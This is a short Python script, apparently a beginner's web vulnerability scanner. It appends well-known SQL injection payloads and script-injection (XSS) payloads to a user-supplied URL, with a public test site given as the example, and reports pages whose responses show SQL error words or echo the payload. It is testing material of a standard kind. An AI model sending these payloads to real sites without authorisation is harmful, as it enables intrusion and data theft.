import requests

print("=== Web Vulnerability Scanner ===")
url = input("Enter target URL (example: http://testphp.vulnweb.com/listproducts.php): ")

sql_payloads = ["' OR '1'='1", "' OR 1=1--", "' OR 'a'='a"]
xss_payloads = ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>"]

print("\n--- Testing for SQL Injection ---")
for payload in sql_payloads:
    test_url = url + "?id=" + payload
    try:
        r = requests.get(test_url)
        if "mysql" in r.text.lower() or "sql" in r.text.lower() or "syntax" in r.text.lower():
            print("[VULNERABLE - SQLi]", test_url)
        else:
            print("[TESTED]", test_url)
    except:
        print("Error connecting to target")

print("\n--- Testing for XSS ---")
for payload in xss_payloads:
    test_url = url + "?id=" + payload
    try:
        r = requests.get(test_url)
        if payload in r.text:
            print("[VULNERABLE - XSS]", test_url)
        else:
            print("[TESTED]", test_url)
    except:
        print("Error connecting to target")
